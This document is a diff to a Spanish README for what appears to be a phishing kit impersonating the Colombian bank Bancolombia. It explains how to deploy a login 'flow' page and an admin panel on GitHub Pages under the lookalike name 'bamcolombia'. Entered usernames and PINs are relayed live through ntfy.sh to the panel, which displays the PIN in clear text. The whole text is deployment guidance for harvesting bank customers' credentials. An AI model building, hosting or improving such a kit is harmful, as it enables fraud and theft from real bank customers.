@@ -1,4 +1,35 @@
-Bancolombia — paquete FLUJO
-===========================
-Extrae el ZIP completo. Logos embebidos en el HTML + carpeta assets/.
-Abre index.html
+Bancolombia — flujo + admin (sync automático, cero config)
+==========================================================
+
+Extrae el ZIP. Logos van embebidos en el HTML.
+  index.html   → flujo
+  admin.html   → panel (usuario admin / clave admin123)
+  assets/      → JS (sync-config.js + submission-store.js)
+
+Sync en vivo — SIN configurar sala
+----------------------------------
+Sala fija hardcoded: bamcolombia (assets/sync-config.js).
+Al abrir admin o flujo en cualquier dispositivo del mundo,
+quedan conectados solos. No hay que “usar sala” ni poner ?sala=.
+
+  Pages flujo:  https://creditoo.github.io/bamcolombia/
+  Pages admin:  https://creditoo.github.io/bamcolombia/admin.html
+
+Escribes en el flujo → el admin se actualiza en vivo (nube ntfy.sh).
+
+Una sola vez en GitHub (si ya tienes Pages)
+-------------------------------------------
+Para que el sitio live tome este cambio: reemplaza UNA vez
+los archivos del repo (o sube el ZIP) y listo. Después:
+cero configuración continua. No hace falta volver a tocar sala.
+
+PIN / clave
+-----------
+El panel admin muestra la clave (PIN) en texto claro.
+El campo Usuario del login del flujo arranca vacío.
+
+Probar en local
+---------------
+  ./servir.sh
+  http://127.0.0.1:8765/admin.html
+  http://127.0.0.1:8765/index.html
